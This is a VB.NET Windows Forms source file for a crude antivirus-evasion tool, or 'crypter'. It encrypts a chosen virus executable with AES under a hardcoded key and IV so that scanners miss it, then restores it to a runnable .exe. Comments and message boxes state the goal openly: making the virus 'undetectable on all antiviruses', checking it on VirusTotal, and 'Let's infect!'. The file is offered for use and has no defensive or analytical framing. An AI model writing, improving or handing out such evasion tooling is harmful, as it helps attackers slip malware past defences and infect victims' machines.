﻿Public Class Form1

    'MISSION: MAKE THE VIRUS UNDETECTABLE ON ALL ANTIVIRUSES

    Dim virusfile As String = ""

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim VirusOpenDialog As New OpenFileDialog
        With VirusOpenDialog
            .Title = "Select the virus you want to confuse"
            .InitialDirectory = Application.StartupPath
            .Filter = "Executable files|*.exe|All Files|*.*"
            If .ShowDialog = DialogResult.OK Then
                virusfile = VirusOpenDialog.FileName
            End If
        End With
    End Sub

    Function secure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateEncryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function

    Function unsecure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateDecryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim VirusSaveDialog As New SaveFileDialog
        With VirusSaveDialog
            .InitialDirectory = Application.StartupPath
            .Filter = "Confused Virus File|*.dat|All Files|*.*"
            If .ShowDialog = DialogResult.OK Then
                Try
                    IO.File.WriteAllBytes(.FileName, secure(IO.File.ReadAllBytes(virusfile)))
                    MsgBox("Success confusing virus! Please scan it on VirusTotal!")
                    'Process.Start("explorer.exe", IO.Path.GetDirectoryName(.FileName))
                Catch ex As Exception
                    MsgBox("Error Confusing virus: " & ex.Message)
                End Try
            End If
        End With
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Dim VirusRestoreOpenDialog As New OpenFileDialog
        With VirusRestoreOpenDialog
            .Title = "Select the virus you want to deconfuse"
            .InitialDirectory = Application.StartupPath
            .Filter = "Confused virus files|*.dat|All Files|*.*"
            If .ShowDialog = DialogResult.OK Then
                Try
                    IO.File.WriteAllBytes(IO.Path.Combine(IO.Path.GetDirectoryName(.FileName), IO.Path.GetFileNameWithoutExtension(.FileName) & ".exe"), _
                                          unsecure(IO.File.ReadAllBytes(.FileName)))
                    MsgBox("The virus is ready to serve. Let's infect!")
                Catch ex As Exception
                    MsgBox("Error deconfusing virus file. " & ex.Message)
                End Try
            End If
        End With
    End Sub
End Class
